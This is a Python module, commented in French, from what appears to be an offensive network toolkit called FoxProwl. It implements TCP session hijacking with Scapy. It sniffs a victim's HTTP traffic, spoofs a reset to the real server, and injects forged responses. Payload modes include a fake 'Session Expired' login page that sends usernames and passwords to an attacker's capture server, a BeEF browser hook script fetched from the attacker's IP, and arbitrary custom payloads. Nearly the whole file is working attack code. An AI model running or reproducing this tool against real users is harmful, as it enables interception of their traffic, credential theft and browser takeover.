"""
modules/session_hijack.py
Session Hijacking TCP ultra-robuste.
- Machine à états complète pour le tracking TCP
- Injection HTML/JS dans les pages HTTP
- Support BeEF hook injection
- Phishing page injection
- Tracking SEQ/ACK précis pour des injections parfaites
"""
import time
import threading
import os
from typing import Dict, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum

from scapy.all import sniff, send, IP, TCP, Raw, Ether

from core.logger import log
from core.config import conf, attack_conf
from core.utils import Counter


class TCPState(Enum):
    """États de la machine à états TCP."""
    CLOSED = 0
    SYN_SENT = 1
    SYN_RECEIVED = 2
    ESTABLISHED = 3
    FIN_WAIT = 4
    CLOSING = 5


@dataclass
class TCPSession:
    """Représente une session TCP traquée."""
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    
    # Numéros de séquence
    client_seq: int = 0
    client_ack: int = 0
    server_seq: int = 0
    server_ack: int = 0
    
    # État
    state: TCPState = TCPState.CLOSED
    last_activity: float = field(default_factory=time.time)
    
    # Flags
    hijacked: bool = False
    payload_injected: bool = False
    
    def session_key(self) -> str:
        """Clé unique pour la session."""
        return f"{self.src_ip}:{self.src_port}-{self.dst_ip}:{self.dst_port}"


class SessionHijacker:
    """
    Session Hijacker professionnel.
    
    Fonctionnalités:
    - Tracking complet des sessions TCP (machine à états)
    - Injection de contenu dans les réponses HTTP
    - Injection de BeEF hooks
    - Injection de pages de phishing
    - RST du serveur légitime pour prendre le contrôle total
    """
    
    # Templates de payload
    BEEF_HOOK_TEMPLATE = '<script src="http://{beef_server}:{beef_port}/hook.js"></script>'
    
    PHISHING_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <title>Session Expired - Login Required</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .login-box {{ background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 300px; }}
        h2 {{ color: #333; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 10px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }}
        button:hover {{ background: #45a049; }}
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🔒 Session Expired</h2>
        <p>Please log in again to continue.</p>
        <form action="http://{capture_server}/capture" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="original_url" value="{original_url}">
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>'''

    JS_INJECTION = '<script>{js_code}</script>'
    
    def __init__(
        self,
        target_ip: str,
        target_ports: list = None,
        mode: str = "phishing",
        beef_server: str = None,
        beef_port: int = 3000,
        custom_payload: str = None,
        capture_server: str = None
    ):
        """
        :param target_ip: IP de la victime
        :param target_ports: Ports HTTP à surveiller (default: [80, 8080])
        :param mode: "phishing", "beef", "inject" ou "custom"
        :param beef_server: IP du serveur BeEF (pour mode beef)
        :param beef_port: Port du serveur BeEF
        :param custom_payload: Payload personnalisé (pour mode custom)
        :param capture_server: Serveur de capture des credentials
        """
        self.target_ip = target_ip
        self.target_ports = set(target_ports or [80, 8080])
        self.mode = mode
        self.beef_server = beef_server or conf.attacker_ip
        self.beef_port = beef_port
        self.custom_payload = custom_payload
        self.capture_server = capture_server or conf.attacker_ip
        
        # Sessions traquées
        self.sessions: Dict[str, TCPSession] = {}
        self._lock = threading.Lock()
        
        # État
        self.running = False
        self._thread: Optional[threading.Thread] = None
        
        # Stats
        self.sessions_hijacked = Counter()
        self.payloads_injected = Counter()
        self.start_time: float = 0.0
    
    def _get_session_key(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int) -> str:
        """Génère une clé unique pour une session."""
        # Normaliser pour que les deux sens de la connexion utilisent la même clé
        if src_ip < dst_ip or (src_ip == dst_ip and src_port < dst_port):
            return f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"
        return f"{dst_ip}:{dst_port}-{src_ip}:{src_port}"
    
    def _get_or_create_session(self, pkt) -> Optional[TCPSession]:
        """Récupère ou crée une session pour un paquet."""
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
            return None
        
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        src_port = pkt[TCP].sport
        dst_port = pkt[TCP].dport
        
        # Vérifier que ça concerne notre cible
        if src_ip != self.target_ip and dst_ip != self.target_ip:
            return None
        
        # Vérifier que c'est sur un port HTTP surveillé
        if dst_port not in self.target_ports and src_port not in self.target_ports:
            return None
        
        key = self._get_session_key(src_ip, src_port, dst_ip, dst_port)
        
        with self._lock:
            if key not in self.sessions:
                # Déterminer qui est le client (notre cible)
                if src_ip == self.target_ip:
                    self.sessions[key] = TCPSession(
                        src_ip=src_ip, src_port=src_port,
                        dst_ip=dst_ip, dst_port=dst_port
                    )
                else:
                    self.sessions[key] = TCPSession(
                        src_ip=dst_ip, src_port=dst_port,
                        dst_ip=src_ip, dst_port=src_port
                    )
            
            return self.sessions[key]
    
    def _update_session_state(self, session: TCPSession, pkt):
        """Met à jour l'état de la session selon le paquet."""
        flags = int(pkt[TCP].flags)
        src_ip = pkt[IP].src
        seq = pkt[TCP].seq
        ack = pkt[TCP].ack
        
        is_from_client = (src_ip == session.src_ip)
        
        # Mettre à jour les numéros de séquence
        if is_from_client:
            session.client_seq = seq
            session.client_ack = ack
        else:
            session.server_seq = seq
            session.server_ack = ack
        
        # Machine à états
        if flags & 0x02:  # SYN
            if flags & 0x10:  # SYN-ACK
                session.state = TCPState.SYN_RECEIVED
            else:
                session.state = TCPState.SYN_SENT
        elif flags & 0x10 and session.state == TCPState.SYN_RECEIVED:  # ACK après SYN-ACK
            session.state = TCPState.ESTABLISHED
        elif flags & 0x01:  # FIN
            session.state = TCPState.FIN_WAIT
        elif flags & 0x04:  # RST
            session.state = TCPState.CLOSED
        
        session.last_activity = time.time()
    
    def _build_payload(self, original_url: str = "") -> str:
        """Construit le payload selon le mode."""
        if self.mode == "beef":
            return self.BEEF_HOOK_TEMPLATE.format(
                beef_server=self.beef_server,
                beef_port=self.beef_port
            )
        elif self.mode == "phishing":
            return self.PHISHING_PAGE.format(
                capture_server=self.capture_server,
                original_url=original_url
            )
        elif self.mode == "custom" and self.custom_payload:
            return self.custom_payload
        else:
            # Mode inject par défaut - simple script alert
            return self.JS_INJECTION.format(
                js_code="alert('FoxProwl - Session Hijacked!');"
            )
    
    def _build_http_response(self, payload: str) -> bytes:
        """Construit une réponse HTTP complète."""
        body = payload.encode()
        headers = (
            f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: text/html; charset=utf-8\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n"
            f"Cache-Control: no-cache, no-store\r\n"
            f"\r\n"
        ).encode()
        return headers + body
    
    def _inject_payload(self, session: TCPSession, pkt):
        """Injecte le payload dans la session."""
        if session.hijacked:
            return
        
        try:
            # Calculer les bons SEQ/ACK
            payload_len = len(pkt[Raw].load) if pkt.haslayer(Raw) else 0
            
            # Le client a envoyé une requête, on va répondre à sa place du serveur
            # Notre SEQ = le ACK que le client attend (ce que le serveur devrait envoyer)
            # Notre ACK = SEQ du client + longueur de sa requête
            
            our_seq = session.client_ack  # Ce que le client attend
            our_ack = session.client_seq + payload_len
            
            # 1. Envoyer RST au serveur pour le faire taire
            rst_to_server = IP(src=session.src_ip, dst=session.dst_ip) / TCP(
                sport=session.src_port,
                dport=session.dst_port,
                flags="R",
                seq=our_ack
            )
            send(rst_to_server, verbose=False, iface=conf.interface)
            
            # 2. Envoyer notre fausse réponse au client
            http_response = self._build_http_response(self._build_payload())
            
            fake_response = IP(src=session.dst_ip, dst=session.src_ip) / TCP(
                sport=session.dst_port,
                dport=session.src_port,
                flags="PA",
                seq=our_seq,
                ack=our_ack
            ) / Raw(load=http_response)
            
            # Envoyer plusieurs fois pour être sûr
            for _ in range(attack_conf.HIJACK_INJECT_COUNT):
                send(fake_response, verbose=False, iface=conf.interface)
            
            # 3. Envoyer FIN pour fermer proprement
            fin_pkt = IP(src=session.dst_ip, dst=session.src_ip) / TCP(
                sport=session.dst_port,
                dport=session.src_port,
                flags="FA",
                seq=our_seq + len(http_response),
                ack=our_ack
            )
            send(fin_pkt, verbose=False, iface=conf.interface)
            
            session.hijacked = True
            session.payload_injected = True
            
            self.sessions_hijacked.increment()
            self.payloads_injected.increment()
            
            log.attack(f"Session hijackée: {session.src_ip}:{session.src_port} → {session.dst_ip}")
        
        except Exception as e:
            log.warning(f"Erreur injection: {e}")
    
    def _handle_packet(self, pkt):
        """Callback pour chaque paquet."""
        session = self._get_or_create_session(pkt)
        if not session:
            return
        
        # Mettre à jour l'état
        self._update_session_state(session, pkt)
        
        # Si c'est une requête HTTP du client (données sortantes)
        if (pkt[IP].src == session.src_ip and 
            pkt.haslayer(Raw) and 
            session.state == TCPState.ESTABLISHED and
            not session.hijacked):
            
            payload = pkt[Raw].load
            
            # Détecter une requête HTTP
            if payload.startswith(b"GET ") or payload.startswith(b"POST "):
                log.info(f"Requête HTTP détectée de {session.src_ip}")
                self._inject_payload(session, pkt)
    
    def _cleanup_old_sessions(self):
        """Nettoie les sessions expirées."""
        now = time.time()
        with self._lock:
            expired = [
                key for key, session in self.sessions.items()
                if now - session.last_activity > 60  # 60 secondes d'inactivité
            ]
            for key in expired:
                del self.sessions[key]
    
    def _main_loop(self):
        """Boucle principale."""
        # Construire le filtre BPF
        port_filter = " or ".join(f"port {p}" for p in self.target_ports)
        bpf = f"tcp and host {self.target_ip} and ({port_filter})"
        
        log.info(f"Filtre BPF: {bpf}")
        
        try:
            sniff(
                iface=conf.interface,
                filter=bpf,
                prn=self._handle_packet,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception as e:
            if self.running:
                log.error(f"Erreur sniff hijack: {e}")
    
    def start(self):
        """Démarre le hijacking."""
        if self.running:
            return
        
        self.running = True
        self.start_time = time.time()
        
        log.attack(f"Session Hijacking démarré - Mode: {self.mode.upper()}")
        log.info(f"  Cible: {self.target_ip}")
        log.info(f"  Ports: {self.target_ports}")
        
        self._thread = threading.Thread(target=self._main_loop, daemon=True)
        self._thread.start()
    
    def stop(self):
        """Arrête le hijacking."""
        if not self.running:
            return
        
        self.running = False
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)
        
        duration = time.time() - self.start_time
        log.success(
            f"Session Hijacking arrêté. "
            f"Durée: {duration:.1f}s, "
            f"Sessions hijackées: {self.sessions_hijacked.value}"
        )
    
    def get_stats(self) -> dict:
        """Retourne les statistiques."""
        return {
            "running": self.running,
            "mode": self.mode,
            "target": self.target_ip,
            "sessions_tracked": len(self.sessions),
            "sessions_hijacked": self.sessions_hijacked.value,
            "payloads_injected": self.payloads_injected.value,
            "duration": time.time() - self.start_time if self.start_time else 0
        }
    
    def __enter__(self):
        self.start()
        return self
    
    def __exit__(self, *args):
        self.stop()
        return False